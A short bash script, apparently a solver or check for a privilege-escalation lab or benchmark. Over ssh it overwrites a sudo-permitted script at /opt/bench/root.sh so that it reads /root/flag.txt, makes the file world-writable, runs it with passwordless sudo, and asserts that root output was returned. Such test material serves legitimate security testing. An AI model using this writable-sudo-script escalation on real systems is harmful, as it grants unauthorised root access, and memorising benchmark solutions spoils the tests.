#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
# Overwrite then run via sudo (proves writable + NOPASSWD).
out="$(ssh_run '
printf "%s\n" "#!/bin/sh" "cat /root/flag.txt" > /opt/bench/root.sh
chmod 777 /opt/bench/root.sh
sudo -n /opt/bench/root.sh
')"
assert_root_output "${out}"
